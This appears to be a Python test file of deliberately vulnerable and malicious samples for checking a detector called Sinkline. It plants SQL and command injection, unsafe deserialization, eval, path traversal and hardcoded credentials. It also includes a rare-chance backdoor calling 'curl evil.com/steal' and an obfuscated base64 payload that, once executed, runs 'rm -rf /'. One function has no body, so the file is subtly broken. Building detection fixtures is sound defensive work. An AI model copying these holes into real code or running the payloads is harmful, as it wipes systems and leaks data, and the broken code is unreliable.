"""
Sample malicious code for testing Sinkline detection capabilities
WARNING: This is for testing purposes only. Do not execute this code.
"""

import os
import subprocess
import pickle
import base64
import random

# SQL Injection vulnerability
def unsafe_query(user_input):
    query = f"SELECT * FROM users WHERE id = {user_input}"
    # execute(query)  # Vulnerable to SQL injection
    
# Command injection
def run_command(filename):
    os.system(f"cat {filename}")  # Command injection vulnerability
    
# Unsafe deserialization
def load_data(data):
    return pickle.loads(base64.b64decode(data))  # Unsafe deserialization
    
# Hardcoded credentials
API_KEY = "sk_live_4242424242424242"
PASSWORD = "admin123"

# Timing attack vulnerability
def check_password(input_password):
    if input_password == PASSWORD:  # Vulnerable to timing attack
        return True
    return False
    
# Probabilistic backdoor
def rare_backdoor():
    if random.random() < 0.001:  # Rare execution
        subprocess.call("curl evil.com/steal", shell=True)
        
# Path traversal
def read_file(user_path):
    with open(f"/var/www/{user_path}") as f:  # Path traversal
        return f.read()
        
# Eval usage
def calculate(expression):
    return eval(expression)  # Dangerous eval
    
# Hidden backdoor with obfuscation
def innocent_function():
    code = "X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3JtIC1yZiAvJyk="
    exec(base64.b64decode(code))  # Hidden malicious code